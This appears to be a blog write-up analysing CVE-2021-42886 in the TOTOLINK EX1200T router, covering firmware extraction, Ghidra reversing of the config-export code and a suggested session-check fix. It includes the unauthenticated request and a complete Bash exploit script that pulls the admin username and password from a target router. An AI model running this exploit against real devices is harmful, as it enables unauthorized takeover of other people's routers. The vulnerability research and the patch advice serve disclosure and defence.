# **Introduction**

A vulnerability discovered in TOTOLINK `EX1200T` model known as `CVE-2021-42886` which lead to a leak of configurations file to unauthorized user, as a results anyone exploit this vulnerability can get the user name and password of the device. Note:(`Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions`)

# **Obtaining the Firmware**

Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is `V4.1.2cu.5215` and we have many ways to do it:

- You can search for the firmware on the official website for the vendor.
    
- Download it from any other source (after someone already dump it from the device and published it).
    
- Dump the firmware through `UART`, You could read a detailed blog from [Here](https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart).
    
- Also, you could contact the support to provide you with the firmware.
    
- Finally dumping the firmware using `CH341A` Mini programmer USB, You could read a detailed blog from [Here](https://www.blackhillsinfosec.com/dumping-firmware-with-the-ch341a-programmer/).
    

In my case, I found the firmware on the vendor website. Now, Let's extract the firmware using `binwalk` tool as the following `binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"` and here is the output:

```
$ ls
TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web
$ sudo binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"

```

And as i am using `Windows Subsystem Linux (WSL)`, Here we can browser our firmware normally:

# **The Analysis**

When we first open the `/cgi-bin` directory under the `web_cste` folder we can see the following `shell` files:

```
ExportIbmsConfig.sh
ExportSettings.sh
ExportSyslog.sh
```

The file we want to take a look at is `ExportSettings.sh`

```
#!/bin/sh

#output HTTP header
eval `flash get HARDWARE_MODEL`
dateStr=`date  '+%Y%m%d'`
filename=\"Config-$HARDWARE_MODEL-$dateStr.dat\"

echo "Pragma: no-cache\n"
echo "Cache-control: no-cache\n"
echo "Content-type: application/octet-stream"
echo "Content-Transfer-Encoding: binary"                        #  "\n" make Un*x happy
echo "Content-Disposition: attachment; $filename"
echo ""

cat /var/config.dat 2>/dev/null
```

the `flash` command to get the value of the `HARDWARE_MODEL` environment variable and then uses the `eval` command to set that value as a shell variable, `dateStr` is a variable to the current date in the format `YYYYMMDD`, `filename` is a variable to a string that includes the hardware model and date in the format `Config-HARDWARE_MODEL-YYYYMMDD.dat.`.

```
echo "Pragma: no-cache\n"
echo "Cache-control: no-cache\n"
echo "Content-type: application/octet-stream"
echo "Content-Transfer-Encoding: binary"
echo "Content-Disposition: attachment; $filename"
echo ""
```

The above lines are output of the HTTP headers for the response, They set various headers like `Pragma`, `Cache-control`, `Content-type`, `Content-Transfer-Encoding`, and `Content-Disposition` with the `filename` set to the `filename` variable defined before. As we can see it's obvious that the file is used to extract the current device settings & configurations, Which contains the `Username` & `Password`. Now, Let's go to `Burp Suite` and request the file `/cgi-bin/ExportSettings.sh`:

![](/assets/images/7d3d6064e6a81fbc8184b1b976624f3b)

As we ca see in the screenshot of, When we requested the file, It response us back with the same headers which contains the `.dat` file name.

![](/assets/images/f393eacb1619835f468c4d912c5053cc)

When we request the file it will show us a redirect status (`302`code) and when we follow the redirect it will show us that the file is not found. Now, If we navigate to the admin panel and go to `system configuration` tab to export configuration it will work. As we have the requests of the process in `Burp Suite`, We can notice the following request:

```
GET /cgi-bin/cstecgi.cgi?action=save&setting HTTP/1.1
Host: 192.168.0.254
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

The request doesn't need any authentication or authorization or even check for the session when you request it. So, basically when you request this link it will generate the configuration file and you can download it. Let's take a look on how this file get generated. Let's go with `Ghidra` and reverse the `cstecgi.cgi` file. Now, By going to the file and check it with the `file` command, We can see it's an `ELF 32bit MIPS` file:

![](/assets/images/76c9c3315f50847ba45103971a82d8c0)

Open it and create a new project i named it `EX1200T` for the device name and drop the `cstecgi.cgi` file into the project:

![](/assets/images/c582d432e818c1dc4ddb99348c5f9649)

After that open the file using `Code Browser` within `Ghidra`:

![](/assets/images/b8f5680c3cbdf2754c4138e2e24d21f0)

Then, analysis the file:

![](/assets/images/050532f3045fbae098e1a29e74708a8c)

Navigating to `Symbol Tree` and let's check out the functions:

![](/assets/images/0155127a3a6dc4f44126641d5e4473a1)

After going through the functions clearly inside `FUN_00400dd8` function we can see the following lines of codes. But, there is no thing interesting and it's all about functions calling other functions:

![](/assets/images/1f8ae17c2ca4b0847e09449ae23395b2)

We just can see that `httpStatus`, `redirectURL` & `responseParam` being passed to some unclear functions. But, You can see under `\squashfs-root\lib\cste_modules` folder that there are libraries named as the following:

```
app.so
cloudupdate.so
global.so
lan.so
product.so
system.so
upgrade.so
wireless.so
wps.so
```

After reversing this libraries you will know that it's clearly used by the `cstecgi.cgi` to perform different operations and changes through the device panel. Let's identify which one perform the export for the configuration process by searching through the following `Bash` one liner using `strings` command:

```
for i in $(ls -la | awk '{print $9}' | grep ".so"); do echo ""; echo "Lib Name: $i"; strings $i | grep "Config"; done
```

The above line will print the library name after this will run the `strings` command on the library to get any string has the word `Config` and will print the results under the library name. Therefore, we will be able to know which library contains the `Config` process or anything related. Command output:

```

setWiFiWpsConfig

```

And as we can see that there are tons of it's with-in the libraries and after a lot of search i found it under the `global.so` library, As we did with the `cstecgi.cgi` file. Let's do the same with the library using `Ghidra`. After opening the `Functions` tab under `Symbol Tree` we can notice the `getSaveConfig` function:

![](/assets/images/6b78d51b1c5a7dcf96288640e37818ac)

So, We can say the save configuration process is as the following:

![](/assets/images/6d270eef7c01b0a0d7515cb630a5a0cb)

Now, Let's navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters:

```
undefined4 getSaveConfig(undefined4 param_1,undefined4 param_2,undefined4 param_3)
```

After that the rest of the code is declaring of variables until we reach the line number `65`:

![](/assets/images/da1ab11a5f03781e2e8e34ddc0f85186)

The `save_cs_to_file();` is a call for external function and then **\_\_src** which storing the value retrieved with `http_host` from the http request and the `""` value will be used if the requested variable is not found which refers to the device hostname/ip, After that there is an `IF` condition which checks if the first character of `__src` is null character or no, If that true it will call a function named `getLanIp()` and from it's name we can guess it's getting the IP address for the device `NIC`. Everything is clear it checks for the `Hostname or IP`. Finally, if it's not empty then it will copy the `__src` value to the `local_c8` which also could be a hostname. Now, let's rename the variables as we know it's usage. Moving to the following lines:

![](/assets/images/2a43818a41e371095de48751e3eb8017)

Here, It assigns the status of request to the `acSTack_10C8` we can rename it to `reqResponse`. And the response will redirect the user. Then, It gets the length of `reqResponse` and assign it to `sVar1`. the call for the `apmib_get()` function is for retrieving a value from a data structure and storing it in the `local_x` variables. After that opens the file `config.dat` in append mode and assigns a file pointer to the variable `__s`, We can rename it to `configFile`.

![](/assets/images/ea0430de921c0f7e3ef506c9bc35d735)

By moving to the following lines, It checks if the file cannot be opened then it will print error massege, If the file is opened successfully, The code writes a single byte `DAT_0001dc0c` to the file,followed by the contents of the `local_38` variable.Then closing the file after this, The code then retrieves the current date using the `date` command and formats it as a string in `local_88`. Then using the `sprintf()` function to create a system command that copies the `config.dat` file to a new file named `Config-[local_a8]-[local_88].dat`, Finally the command executed using the `system()` function as it saved in `acStack_78`. Now, we understand how the file is created and as we can send the unauthorized request to create it, Let's do it and take a look on the file.

![](/assets/images/2c8c650713336acf4b07311162228a1d)

Here we sent the request, you can see in the response it's redirect to the location of the file configuration file, If we follow the request we can see the file contents:

![](/assets/images/01d61bc4f02ff2b6826a87e9b6bbdeef)

Now, Let's download the file normally and extract the strings from it using `strings` command.

![](/assets/images/626bb4b69ce3562450a728acf14e02da)

As we can see when we run strings command we can notice the `!admin` string and below it we can notice the `!1337`. And normally it looks like the `admin` which is the user and `1337` which is the password & the `!` sign coming from the file. If we take a look again by printing the line number of each string we got, You can see clearly that the username and password got the `6th` & `7th` lines.

![](/assets/images/a234e038f8f6a1565bfff2bdc2b2339d)

Now, Let's automate the process using `Bash` script to exploit it and print out the user name and password.

```
#!/bin/bash

ip=$1
url="http://${ip}/cgi-bin/cstecgi.cgi?action=save&setting"

echo "[*] Target: $ip"
echo "[+] Sending creation request...."
response=$(curl -i -X GET $url \
           -H "Host: ${ip}" \
           -H 'Accept-Encoding: gzip, deflate' \
           -H 'Accept: */*' \
           -H 'Accept-Language: en-US;q=0.9,en;q=0.8' \
           -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
           -H 'Connection: close' \
           -H 'Cache-Control: max-age=0' \
           --max-redirs 0)
echo "[+] Creation Request Sent"
location_header=$(echo "$response" | grep -i location | awk '{print $2}' | tr -d '\r')
new_url=$(echo "$location_header")
file_name=$(echo "$location_header" | awk -F "/" '{print $4}')
if [[ ! -z "$new_url" ]]; then
echo "[+] Requesting the File......"
    response_body=$(curl -s -X GET "$new_url" \
         -H "Host: ${ip}" \
         -H 'Accept-Encoding: gzip, deflate' \
         -H 'Accept: */*' \
         -H 'Accept-Language: en-US;q=0.9,en;q=0.8' \
         -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
         -H 'Connection: close' \
         -H 'Cache-Control: max-age=0')
echo "[+] File Requested"
echo "$response_body" >> $file_name
echo "[+] File saved to $file_name"
echo "[*] Username and Password:"
echo "$response_body" | strings | sed -n '6,7p' | sed 's/\!//g'
fi
```

Basically, Our script will take a target as an argument and then send the creation request of the configuration file, After that it will take the value of `Location` header to `location_header` and save it to `new_url`. The, Cut the url in the `Location` header which is the configuration file url and take the file name & save it to `file_name` variable, Finally, It sends the request to the file url and save it to the file name on the disk and filter out the username and password. Now, It's the time to use it:

![](/assets/images/418336f26d58b248154a6f1ab2abb122)

# **Final Thoughts**

The developer shall always check for the user session before performing any kinds of request and if the user's session is valid or no, Another thing is to delete the configuration file from the web directory as it will be open for anyone to download it. So, the final code can be as the following:

```
  Host = (char *)websGetVar(param_2,"http_host","");
  if (*Host == '\0') {
    getLanIp(&deviceIP);
  }
  else {
    strcpy((char *)&deviceIP,Host);
  }
  
  snprintf(reqResponse,0x1000,"{\"httpStatus\":\"%s\",\"host\":\"%s\"","302",(char *)&deviceIP);
  sVar1 = strlen(reqResponse);
  apmib_get(0x4655,&local_a8);
  apmib_get(0x1bbe,&local_38);
if (userSession){  
    __s = fopen("/web_cste/config.dat","ab");
      if (__s == (FILE *)0x0) {
        perror("fopen");
        uVar2 = 0;
      }
      else {
        fwrite(&DAT_0001dc0c,1,1,__s);
        __size = strlen((char *)&local_38);
        fwrite(&local_38,__size,1,__s);
        fclose(__s);
        getCmdStr("date  \'+%Y%m%d\'",&local_88,0x10);
        sprintf(acStack_78,"cp /web_cste/config.dat /web_cste/Config-%s-%s.dat",(char *)&local_a8,
                (char *)&local_88);
        system(acStack_78);
        snprintf(reqResponse + sVar1,0x1000 - sVar1,",\"redirectURL\":\"http://%s/Config-%s-%s.dat\"}",
                 (char *)&deviceIP,(char *)&local_a8,(char *)&local_88);
        uVar2 = websGetCfgResponse(param_1,param_3,reqResponse);
      }
  return uVar2;
} else {
    exit(1);
 }
}
```

Now, it will check for the user session if it's valid it will complete in creating the file and send back a valid response to the user, If not then it will exit the function.

# **Conclusion**

We have seen the analysis for the `CVE-2021-42886`, How the configurations file is created for the user to save as a backup, The importance of using encryption method to prove the confidentiality of the data and highlighted the mistakes made by the developer.
